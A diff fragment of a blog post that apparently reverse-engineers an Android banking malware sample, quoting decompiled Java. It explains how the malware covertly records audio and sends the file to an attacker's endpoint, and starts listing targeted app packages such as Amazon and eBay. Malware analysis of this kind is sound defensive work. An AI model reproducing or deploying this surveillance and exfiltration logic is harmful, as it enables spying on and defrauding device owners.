+                        sb <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> StringBuilder<span style="color:#f92672">();</span>
+                        sb<span style="color:#f92672">.</span><span style="color:#a6e22e">append</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Record Sound! &#34;</span><span style="color:#f92672">);</span>
+                        sb<span style="color:#f92672">.</span><span style="color:#a6e22e">append</span><span style="color:#f92672">(</span>e<span style="color:#f92672">);</span>
+                        bVar<span style="color:#f92672">.</span><span style="color:#a6e22e">mo213a</span><span style="color:#f92672">(</span>str<span style="color:#f92672">,</span> sb<span style="color:#f92672">.</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">());</span>
+                    <span style="color:#f92672">}</span>
+
+                    <span style="color:#f92672">[...</span> another <span style="color:#66d9ef">catch</span> block that does the same thing<span style="color:#f92672">]</span>
+                <span style="color:#f92672">}</span>
+            <span style="color:#f92672">}</span>
+        <span style="color:#f92672">});</span>
+</code></pre></div><p><code>SomeHttpClass.mo213a</code> is called with the same argument as the try block. Inside it, theres another try catch block, both do the same thing as the previous try block.</p>
+<p>same applies to this block too&hellip;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">        <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
+            mediaRecorder<span style="color:#f92672">.</span><span style="color:#a6e22e">prepare</span><span style="color:#f92672">();</span>
+            mediaRecorder<span style="color:#f92672">.</span><span style="color:#a6e22e">start</span><span style="color:#f92672">();</span>
+            thread<span style="color:#f92672">.</span><span style="color:#a6e22e">start</span><span style="color:#f92672">();</span>
+        <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>IOException unused<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+        <span style="color:#f92672">}</span>
+    <span style="color:#f92672">}</span>
+</code></pre></div><p>this is the block that actually starts the thread :).
+Soo what this method actually does is, it starts recording audio on the given source, waits until <code>i</code> amount of time and stops recording. then it calls our <code>SomeHttpClass.SendFileToEndpoint</code> method to send it to an endpoint so attacker can recieve the file.</p>
 <p>Lets get an idea of how this malware gets banking applications.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#75715e">/* renamed from: wocwvy.czyxoxmbauu.slsa.a */</span>
 <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">BankingApps</span> <span style="color:#f92672">{</span>
@@ -1024,6 +1164,7 @@ Connection. for example, it first sets <code>UseCaches</code> to false, <code>Do
 - com.amazon.mShop.android.shopping
 - com.ebay.mobile
 </code></pre>
+<p>if it does, it replaces the name with an empty string and append the name to the end of <code>str</code>.</p>
 
       </div></div>
 
